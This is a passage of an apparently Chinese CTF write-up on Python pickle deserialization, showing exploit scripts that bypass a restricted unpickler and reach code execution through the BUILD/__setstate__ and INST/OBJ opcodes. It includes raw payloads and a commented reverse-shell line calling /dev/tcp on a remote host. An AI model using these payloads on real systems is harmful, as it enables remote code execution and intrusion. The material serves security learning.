&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">run&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">host&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#39;0.0.0.0&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">port&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">5000&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>çœ‹æºç ï¼Œopcodeéƒ¨åˆ†banæŽ‰äº†&lt;code>R&lt;/code>æ“ä½œç ï¼ˆè°ƒç”¨ä¸€ä¸ªcallableå¯¹è±¡ï¼‰ï¼Œä¸èƒ½ç”¨&lt;code>__reduce__&lt;/code>äº†ï¼›ä¹Ÿé‡å†™äº†&lt;code>find_class()&lt;/code>ï¼Œmoduleå¿…é¡»æ˜¯&lt;code>__main__&lt;/code>ï¼›æˆ‘ä»¬çš„ç›®æ ‡æ˜¯&lt;/p>
&lt;p>&lt;code>restricted_loads(base64.b64decode(pickle_data)) == Animal(secret.name, secret.category)&lt;/code>ä¸ºçœŸï¼Œå³correct==True&lt;/p>
&lt;p>è¿™é‡Œæˆ‘ä»¬é€šè¿‡åŠ è½½&lt;code>__main__.secret&lt;/code>å¯ä»¥å¼•å…¥secretæ¨¡å—ï¼Œæ¥æŠŠ&lt;code>secret.name&lt;/code>å’Œ&lt;code>secret.category&lt;/code>è¿™ä¸¤ä¸ªå˜é‡è¦†ç›–ä¸ºä»»æ„å­—ç¬¦ä¸²ï¼Œå†ä»¥è¿™ä¸ªå­—ç¬¦ä¸²ä¸ºå‚æ•°æž„é€ Animalå¯¹è±¡ï¼ˆæ ˆé¡¶å¯¹äºŽtypeçš„æ£€æŸ¥ï¼‰&lt;/p>
&lt;p>pker&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#111">secret&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">GLOBAL&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;secret&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>
&lt;span style="color:#111">secret&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>
&lt;span style="color:#111">animal&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#39;__main__&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;Animal&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#39;frieggs&amp;#39;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">animal&lt;/span>
&lt;span style="color:#75715e"># b&amp;#34;c__main__\nsecret\np0\n0g0\n(}(S&amp;#39;name&amp;#39;\nS&amp;#39;frieggs&amp;#39;\ndtbg0\n(}(S&amp;#39;category&amp;#39;\nS&amp;#39;frieggs&amp;#39;\ndtb(S&amp;#39;frieggs&amp;#39;\nS&amp;#39;frieggs&amp;#39;\ni__main__\nAnimal\np3\n0g3\n.&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>æˆ–è€…æž„é€ çš„exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Animal&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">category&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">name&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">category&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__repr__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">f&lt;/span>&lt;span style="color:#d88200">&amp;#39;Animal(name=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">, category=&lt;/span>&lt;span style="color:#d88200">{&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>&lt;span style="color:#d88200">!r}&lt;/span>&lt;span style="color:#d88200">)&amp;#39;&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__eq__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">other&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#111">Animal&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">and&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span> &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#111">other&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">category&lt;/span>
&lt;span style="color:#111">print&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">dumps&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">Animal&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;x&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">category&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;y&amp;#34;&lt;/span>&lt;span style="color:#111">),&lt;/span> &lt;span style="color:#111">protocol&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#ae81ff">3&lt;/span>&lt;span style="color:#111">))&lt;/span>
&lt;span style="color:#75715e"># b&amp;#39;\x80\x03c__main__\nAnimal\nq\x00)\x81q\x01}q\x02(X\x04\x00\x00\x00nameq\x03X\x01\x00\x00\x00xq\x04X\x08\x00\x00\x00categoryq\x05X\x01\x00\x00\x00yq\x06ub.&amp;#39;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>â€”â€”â€”â€”æ‰€ä»¥åœ¨ä¸å…è®¸&lt;code>b'R'&lt;/code>çš„æƒ…å†µä¸‹ï¼Œæ€è·¯åˆ™æ˜¯ç¯¡æ”¹secretä¸­çš„nameå’Œcategoriyï¼Œå•çº¯çš„ç”¨&lt;code>b'c'&lt;/code>å¼•å…¥æ¨¡å—å¯¹Animalè¿›è¡Œå®žä¾‹åŒ–ï¼Œè¿™ä¸€è¿‡ç¨‹ä¹Ÿç›¸å½“äºŽæ˜¯æ‰§è¡Œäº†å‡½æ•°&lt;/p>
&lt;/details>
&lt;p>ä¸€ç§è§£å†³åŠžæ³•å°±æ˜¯è¿™ä¸ªæ —å­ä¸­çš„ï¼Œå¹²è„†å°±ä¸rceï¼Œè€Œæ˜¯ç”¨&lt;code>b'c'&lt;/code>å˜é‡è¦†ç›–ï¼Œæ€è·¯å°±æ˜¯ä¸Šä¸ªä¸‰çº§æ ‡é¢˜ä¸‹é¢çš„é‚£ä¸ªå¤§æ®µï¼Œä¸å†èµ˜è¿°ã€‚&lt;/p>
&lt;h3 id="--ä½¿ç”¨__setstate__bbå®žçŽ°rce">&amp;ndash;&amp;raquo;ä½¿ç”¨&lt;code>__setstate__&lt;/code>&amp;amp;&lt;code>b'b'&lt;/code>å®žçŽ°rce&lt;/h3>
&lt;p>å¦ä¸€ç§æ–¹å¼æ˜¯ç”¨BUILDæŒ‡ä»¤&lt;code>b'b'&lt;/code>åŠè¿›è¡Œrceã€‚&lt;/p>
&lt;p>åœ¨pickleæºç ä¸­BUILDæŒ‡ä»¤æ˜¯è¿™æ ·çš„&lt;/p>
&lt;p>&lt;img src="https://pic2.zhimg.com/80/v2-ae7ce8d82f16d90bda791e4bc5e06f1d_1440w.jpg" alt="img">&lt;/p>
&lt;p>å¦‚æžœä¸€ä¸ªå®žä¾‹instæ‹¥æœ‰&lt;code>__setstate__&lt;/code>æ–¹æ³•ï¼Œåˆ™æŠŠ&lt;code>state&lt;/code>äº¤ç»™&lt;code>__setstate__&lt;/code>æ–¹æ³•æ¥å¤„ç†ï¼›å¦åˆ™ç›´æŽ¥æŠŠ&lt;code>state&lt;/code>è¿™ä¸ª&lt;code>dist&lt;/code>çš„å†…å®¹åˆå¹¶åˆ°&lt;code>inst.__dict__ &lt;/code>å†…ã€‚&lt;/p>
&lt;p>å¦‚æžœä¸€ä¸ªç±»åŽŸæœ¬æ²¡æœ‰&lt;code>__setstate__&lt;/code>è¿™ä¸ªæ–¹æ³•ï¼Œå½“æˆ‘ä»¬ç”¨&lt;code>{'__setstate__': os.system}&lt;/code>æ¥BUILDè¿™ä¸ªå¯¹è±¡ï¼Œé‚£ä¹ˆçŽ°åœ¨å¯¹è±¡çš„&lt;code>__setstate__&lt;/code>å°±å˜æˆäº†&lt;code>os.system&lt;/code>ï¼›æŽ¥ä¸‹æ¥åˆ©ç”¨&lt;code>&amp;quot;ls /&amp;quot;&lt;/code>æ¥å†æ¬¡BUILDè¿™ä¸ªå¯¹è±¡ï¼Œåˆ™ä¼šæ‰§è¡Œ&lt;code>setstate(&amp;quot;ls /&amp;quot;)&lt;/code> ï¼Œè€Œæ­¤æ—¶&lt;code>__setstate__&lt;/code>å·²ç»è¢«æˆ‘ä»¬è®¾ç½®ä¸º&lt;code>os.system&lt;/code>ï¼Œå› æ­¤å®žçŽ°äº†rce&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">os&lt;/span>
&lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Student&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#111">__init__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;amelia&amp;#39;&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">grade&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">&amp;#39;A1&amp;#39;&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&lt;/span>&lt;span style="color:#8045ff">\x80\x03&lt;/span>&lt;span style="color:#d88200">c__main__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Student&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">)&lt;/span>&lt;span style="color:#8045ff">\x81&lt;/span>&lt;span style="color:#d88200">}(V__setstate__&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">cos&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">system&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">ubVls /&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">b.&amp;#39;&lt;/span>
&lt;span style="color:#75715e"># shell = b&amp;#34;&amp;#34;&amp;#34;\x80\x03c__main__\nStudent\n)\x81}(V__setstate__\ncos\nsystem\nubS&amp;#39;bash -c &amp;#34;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.29/8426 0&amp;gt;&amp;amp;1&amp;#34;&amp;#39;\nb.&amp;#34;&amp;#34;&amp;#34;&lt;/span>
&lt;span style="color:#111">pickle&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">loads&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">payload&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810025215320.png" alt="image-20210810025215320">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210810025143114.png" alt="image-20210810025143114">&lt;/p>
&lt;p>å¯ä»¥çœ‹åˆ°æˆåŠŸåšåˆ°äº†rce~~åå¼¹shellå½“ç„¶ä¹Ÿå¯ä»¥&lt;/p>
&lt;h3 id="--ä½¿ç”¨_instantiateload_objload_instbobiå®žçŽ°rce">&amp;ndash;&amp;raquo;ä½¿ç”¨&lt;code>_instantiate()&lt;/code>&amp;amp;&lt;code>load_obj()&lt;/code>&amp;amp;&lt;code>load_inst()&lt;/code>&amp;amp;&lt;code>b'o'&lt;/code>&amp;amp;&lt;code>b'i'&lt;/code>å®žçŽ°rce&lt;/h3>
&lt;ul>
&lt;li>
&lt;p>&lt;code>_instantiate()&lt;/code>: Create a new object via klass(*args); Leads to arbitrary function call actually&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">_instantiate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">or&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#111">isinstance&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">or&lt;/span>
&lt;span style="color:#111">hasattr&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;__getinitargs__&amp;#34;&lt;/span>&lt;span style="color:#111">)):&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#75715e"># Arbitrary function all&lt;/span>
&lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#00a8c8">except&lt;/span> &lt;span style="color:#75af00">TypeError&lt;/span> &lt;span style="color:#00a8c8">as&lt;/span> &lt;span style="color:#111">err&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#00a8c8">raise&lt;/span> &lt;span style="color:#75af00">TypeError&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;in constructor for &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">: &lt;/span>&lt;span style="color:#d88200">%s&lt;/span>&lt;span style="color:#d88200">&amp;#34;&lt;/span> &lt;span style="color:#f92672">%&lt;/span>
&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__name__&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">str&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">err&lt;/span>&lt;span style="color:#111">)),&lt;/span> &lt;span style="color:#111">sys&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">exc_info&lt;/span>&lt;span style="color:#111">()[&lt;/span>&lt;span style="color:#ae81ff">2&lt;/span>&lt;span style="color:#111">])&lt;/span>
&lt;span style="color:#00a8c8">else&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">value&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">__new__&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">append&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">value&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>load_obj()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">load_obj&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#75715e"># Stack is ... markobject classobject arg1 arg2 ...&lt;/span>
&lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop_mark&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">cls&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">_instantiate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">cls&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dispatch&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">OBJ&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">load_obj&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;li>
&lt;p>&lt;code>load_inst()&lt;/code>&lt;/p>
&lt;ul>
&lt;li>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">load_inst&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#75715e"># read from user input&lt;/span>
&lt;span style="color:#111">module&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">readline&lt;/span>&lt;span style="color:#111">()[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ascii&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">name&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">readline&lt;/span>&lt;span style="color:#111">()[:&lt;/span>&lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">]&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">decode&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ascii&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">klass&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">find_class&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">module&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#75715e"># get args from stack&lt;/span>
&lt;span style="color:#111">args&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pop_mark&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#111">self&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">_instantiate&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">klass&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">dispatch&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#111">INST&lt;/span>&lt;span style="color:#111">[&lt;/span>&lt;span style="color:#ae81ff">0&lt;/span>&lt;span style="color:#111">]]&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">load_inst&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;/li>
&lt;/ul>
&lt;p>exp.py&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-python" data-lang="python">&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">pickle&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">struct&lt;/span>
&lt;span style="color:#f92672">import&lt;/span> &lt;span style="color:#111">base64&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">exploit&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">):&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#111">type&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#f92672">is&lt;/span> &lt;span style="color:#111">list&lt;/span>
&lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;((&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload_suffix&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;&amp;#39;&amp;#39;lisubprocess&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">Popen&lt;/span>&lt;span style="color:#8045ff">\n&lt;/span>&lt;span style="color:#d88200">.&amp;#39;&amp;#39;&amp;#39;&lt;/span>
&lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;span style="color:#00a8c8">for&lt;/span> &lt;span style="color:#111">c&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">command&lt;/span>&lt;span style="color:#111">:&lt;/span>
&lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">+=&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#34;X&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">struct&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#111">pack&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;&amp;lt;I&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">len&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">)))&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">bytes&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#111">c&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#111">encoding&lt;/span>&lt;span style="color:#f92672">=&lt;/span>&lt;span style="color:#d88200">&amp;#34;utf-8&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">payload_prefix&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_body&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">payload_suffix&lt;/span>
&lt;span style="color:#00a8c8">assert&lt;/span> &lt;span style="color:#d88200">b&lt;/span>&lt;span style="color:#d88200">&amp;#39;R&amp;#39;&lt;/span> &lt;span style="color:#f92672">not&lt;/span> &lt;span style="color:#f92672">in&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">payload&lt;/span>
&lt;span style="color:#00a8c8">def&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#111">():&lt;/span>
&lt;span style="color:#111">payload&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">exploit&lt;/span>&lt;span style="color:#111">([&lt;/span>
